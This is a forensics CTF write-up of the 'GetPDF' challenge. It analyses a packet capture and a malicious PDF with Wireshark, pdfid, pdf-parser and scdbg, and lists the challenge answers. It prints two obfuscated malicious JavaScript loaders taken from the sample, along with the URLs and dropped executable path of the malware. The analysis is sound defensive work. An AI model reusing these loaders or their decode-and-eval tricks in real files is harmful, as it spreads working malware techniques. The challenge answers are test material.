---
layout: post
title: GetPDF Threat Hunting writeup
categories: [CTF, Forensics, Threat-Hunting]
tags: [CTF, Malware-Analysis, Incident-Response, Blue-team]
---
Point: 1200

<https://cyberdefenders.org/blueteam-ctf-challenges/progress/rootware/47/>

## Category

Forensics, Threat-Hunting, Malware-Analysis

## Solution

### How many URL path(s) are involved in this incident?

```text
http.request.method == GET
```

![urls](https://bn1304files.storage.live.com/y4mkLH7_rt_96G8rYCTiXp5xdftFR9aKa0jmaNJCRV-KXPXPbZEN2qYpnaucs1aR2Az3u3HqquOBmX4CdEBTKQ-iMbLXqtjTTSCi88sBu7ym7GQV8A-igmu7OjJia6RMa8rYA-mX-3tmdPxrTcSBtWBYSWBguyQLspBTB14C3Lzd3A7cOyq1xfJ9VoI-OCfDtK-?width=2872&height=334&cropmode=none)
There are altogether 6 unique URLs after analyzing the pcap file in wireshark.
Answer: 6

### What is the URL which contains the JS code?

![jsurl](https://bn1304files.storage.live.com/y4m6398aFoTRwwSQiQ5ad5wJIMAMNQ--_Dow8jMD-gXlreBH_DjyjK0FGXcnsPviTiYfOVm9vmXenbVFmMtIzoMgfOxeO1j9q1DnJnNmYDGyAx9IWIp1MYviOPSkNNQVJmP-D6XU-7bkSNiOpEDfSxpji2As9vRbXg1u_R0oCD_VTbcZUVDwsUue8_8Rd6w4okG?width=2872&height=1506&cropmode=none)

So the full URL path that contains the JS code is
<http://blog.honeynet.org.my/forensic_challenge/>

### What is the URL hidden in the JS code?

After extracting the JS code and using beautifier.io to decipher the JS code, we can see that the code is constructing a URL.

```javascript
var DepanNegw = window;
var DexeTelae = -44;
DexeTelae += 45;
XayeZebah = 'nedajemac';
var GaDemee = 'e5vfqaIVblI5'.replace(/[5fqIVbI5]/g, '');
ZavevTa = 'fazemezarawaseb';
var MezRai = parseInt;
var DayahDet = 'zafezed lacet cetexet jevecakemahamaha febenep cafa fezebefe yelaxa xejarer hejefaqazedeka kebeneh petaqe zevexej jenewabahegehar jabevame bayap def vasefezetevamer nefelaba sezaxewe qajeqeme wet reyeqer magemefele xelawece denew jafelev haweqa kel vatabaser mag vejefama xeca canapevezejev benaper gezazevaja zeyaxaf wehekeh jecalava set senajaj re kameken bazafakaqewate zaralek yecele kak s hexebeka heha jeyeteg sase wayefewa tey gawewem wefaravavepayeke xedevec gavayedegeqer casehes watenanesajet jelagal payevexebe pejasep heqefagabexemew deheler vejegeca hece rafenadamenaxe jaz fex hekases pazetepajamelew cerasej nevayezabevepeke pex gey dac g dezaleza kekeqebe peyemaf sevanededa cefagey defef cexaqehe sebex galahal zadaxaran lava falamedejegase set law mefe wa mex ces nam j xaxaped gexeqageb feqeled daseze tehadeh zeheteyera xanahef wepahena xarakel gadazecaq tabexape dareq seje lejegagaxavade haf jaz cewe me cag kem fed h legefaz taw keyacah wefereweverewaze rapecame kas fagavev facez yefeley lareke seperene gav lece gahepegesafeve dez gen yeje s waz qas xap c hademax mezezah qepawehe vad zejates pe cehajeg sabebaseqeseda sekesav nebeda cagareg kec fexewel bejewagedegeqene bajesade lav pasepad baraj xecavan vedepe veranake vej heva kejajemacajada wez saj vele x qaj vad fag y qetamefe jaxa kamatare net zeheweh jeme bale cexebedeleneye dab vev kekaxex jetecajek lejekabe qalef bevegeye caxeb beleteqe r hele saxafexazat baz dehakajegeqeneke met mefepexafecebera qwertyu iop asdfghj klzxcvbnmqwer tyuiopa sdfghjklzxcvbnmq hjklzxc vbnmqwer tyu iopasdfghjklzxc vbnmqwe rtyuiopas dfghjkl zxcvbnmqwertyuio pasdfgh jklzxcvbnmqwert yuiopas dfghjk lzxcvbnm qwertyuiop asdfghj klzxcvbnmqwerty uiopasd fghjkl zxcvbnmq werty uio pasdfghjklzxcvb nmqwert yuiopasdfghjklzx cvbnmqwe rty uiopasd fghjklzx uio pasdfghjklzxcvb nmqwert uiopasdfghjklz qwertyui opasdfghjk xcr vbnmqwertyuiopar sdfghjr klzxcvr bnmqwer rtyuiopasdfghjkr lzxcvbnr mqr wertyur iopasr dfghjkr lzxcvbnmqwertyr uiopasdr fghr jklzxcr vbnmqwertr yuiopar sdfr ghjklr zxcvbnmqwertyuir opasdfr ghjr klzxcvr bnmqwertr yuiopar sr dfghjkr lzxcvbnmqwerr dfghjkr lzxcvbnmqwerr tyuiopr asdfgr hjklzxr cvbnmqwertyuior pasdfgr hjklzxcr vbnmqwr ertyur met mefepexafecebera xanahef wepahena feqeled daseze tabexape dareq zexelede l cefagey defef hademax mezezah req batekeqaheteceh zateyene c zekeqay ratevecek veheleqe k dec tec xece jefexazeqayefes cama bapevexeladet keh lanawebasegecaja qefejev qepetekene dacegas relevaj fecasece ber veyayes ba kajebed savaketegemeqe wepecer lamege tere ratavacevejezax gey dasalaje gav yepakekehe'.split(' ');
var ZeJexn = '';
var SerayYafags = String;
var KesXanavn = -50;
KesXanavn += 66;
XadHef = 78;
var BeZao = 47;
BeZao += -47;
var FeceSabejo = -46;
FeceSabejo += 48;
GebJep = 92;
var SeWajec = 'ftr9wogmBwJCW5h6aixrPRCs1ZonjHjdjKueMkD'.replace(/[t9wgBwJW56ixPRs1ZnjHjjKuMkD]/g, '');
MaqTa = 5;
GaDemee = DepanNegw[GaDemee];
SeWajec = SerayYafags[SeWajec];
for (YajMedei = BeZao; YajMedei < DayahDet.length - 1; YajMedei += FeceSabejo) ZeJexn += SeWajec(MezRai((DayahDet[YajMedei + BeZao].length - 1).toString(KesXanavn) + (DayahDet[YajMedei + DexeTelae].length - 1).toString(KesXanavn), KesXanavn));
GaDemee(ZeJexn);
```

The code is run in chrome browser console and returned an error message saying that it is actually requesting a URL which is blocked by chrome due to the request being insecure
<http://blog.honeynet.org.my/forensic_challenge/getpdf.php>

### What is the MD5 hash of the PDF file contained in the packet?

1. Export the `fcexploit.pdf` file from the http requests within wireshark.
2. Hash the file using md5 command as below.

```bash
md5 fcexploit.pdf 
```

```shell
MD5 (fcexploit.pdf) = 659cf4c6baa87b082227540047538c2a
```

### How many object(s) are contained inside the PDF file?

```bash
wget https://raw.githubusercontent.com/mlodic/pdfid/main/pdfid/pdfid.py
python pdfid.py fcexploit.pdf
```

```shell
PDFiD 0.2.7 fcexploit.pdf
 PDF Header: %PDF-1.3
 obj                   19
 endobj                18
 stream                 5
 endstream              5
 xref                   1
 trailer                1
 startxref              1
 /Page                  2
 /Encrypt               0
 /ObjStm                0
 /JS                    1
 /JavaScript            1
 /AA                    0
 /OpenAction            1
 /AcroForm              1
 /JBIG2Decode           0
 /RichMedia             0
 /Launch                0
 /EmbeddedFile          1
 /XFA                   1
 /Colors > 2^24         0
```

There are 19 objects.

### How many filtering schemes are used for the object streams?

By user pdf-parser the pdf file's streams can be analyzed

```bash
pdf-parser fcexploit.pdf  
```

```shell
obj 4 0
 Type: /Action
 Referencing: 5 0 R

  <<
    /Type /Action
    /S /JavaScript
    /JS 5 0 R
  >>


obj 5 0
 Type: 
 Referencing: 
 Contains stream

  <<
    /Length 395
    /Filter [ /FlateDecode /ASCII85Decode /LZWDecode /RunLengthDecode ]
  >>
```

In the output above object 4 which contains javascript code is referencing object 5 which filters the contents of object 4. From the `/Filter` we can see that there are 4 encoding functions.

### What is the number of the 'object stream' that might contain malicious JS code?

```javascript
var SSS = null;
var SS = "ev";
var $S = "";
$5 = "in";
app.doc.syncAnnotScan();
S$ = "ti";
if (app.plugIns.length != 0) {
    var $$ = 0;
    S$ += "tl";
    $5 += "fo";
    ____SSS = app.doc.getAnnots({nPage: 0});
    S$ += "e";
    $S = this.info.title;
}
var S5 = "";
if (app.plugIns.length > 3) {
    SS += "a";
    var arr = $S.split(/U_155bf62c9aU_7917ab39/);
    for (var $ = 1; $ < arr.length; $++) {
        S5 += String.fromCharCode("0x" + arr[$]);
    }
    SS += "l";
}
if (app.plugIns.length >= 2) {
    app[SS](S5);
}
```

The above stream contains malicious JS code.
Answer: 5

### Analyzing the PDF file. What 'object-streams' contain the JS code responsible for executing the shellcodes? The JS code is divided into two streams. Format: two numbers separated with ','. Put the numbers in ascending order

Analyze the PDF file in PDFStreamDumper. Debug the JS script in object 5. The JS gets the content of the 10th object stream and removes the "U_155bf62c9aU_7917ab39" string from it.

Scan the resulted JS code from the previous step. The JS gets the content of the 9th object stream and removes the "X_17844743X_170987743" string from it, then gets the content of the 7th stream and removes the "89af50d" string, then concatenate the 2 JS code. The answer is 7,9

### The JS code responsible for executing the exploit contains shellcodes that drop malicious executable files. What is the full path of malicious executable files after being dropped by the malware on the victim machine?

The JS code contains 4 different versions of the same shellcode.

Using scdbg to emulate any one of the shellcodes. You will find that the shellcode calls URLDownloadToFileA API. The answer is c:\WINDOWS\system32\a.exe

### The PDF file contains another exploit related to CVE-2010-0188. What is the URL of the malicious executable that the shellcode associated with this exploit drop?

Using `pdf-parser -a fcexploit.pdf` command. You will get that the 11th object stream contains an Embedded object.

Analyze the PDF in PDFStreamDumper and check the 11th object stream in the PDF file. Extract the content of the object stream.

Use file utility to check the file type. The file is Zlib compressed. Use PDFStreamDumper -> Tools -> Zlib Decompress_file to get the actual content of the exploit

Decode the base64 string you will get the shellcode. Using scdbg to emulate the shellcode. The URL is <http://blog.honeynet.org.my/forensic_challenge/the_real_malware.exe>

### How many CVEs are included in the PDF file?

Answer: 5
The JS code extracted from the 7th and 9th streams contains 4 CVEs, and the 11th stream has the 5th one.
